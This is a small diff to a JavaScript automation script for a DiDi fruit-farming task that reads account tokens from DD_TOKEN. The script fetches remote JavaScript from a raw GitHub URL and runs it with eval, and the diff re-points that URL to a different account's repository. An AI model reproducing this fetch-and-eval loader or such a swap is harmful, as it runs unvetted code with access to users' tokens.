@@ -29,7 +29,7 @@ docker环境变量名:DD_TOKEN,多账号换行或英文逗号(,)隔开
 const $ = new API("dd_fruit");
 !(async () => {
     //https://cdn.jsdelivr.net/gh/passerby-b/didi_fruit@main/dd_fruit_code.js
-    await $.http.get({ url: 'https://raw.githubusercontent.com/kashichi-Ali/Kashi/main/didifruit/dd_fruit_code.js' }).then(async response => {
+    await $.http.get({ url: 'https://raw.githubusercontent.com/129Ka/ak9/main/didifruit/dd_fruit_code.js' }).then(async response => {
         if (!!response.body) await eval(response.body);
     });
 })().catch(async (e) => {
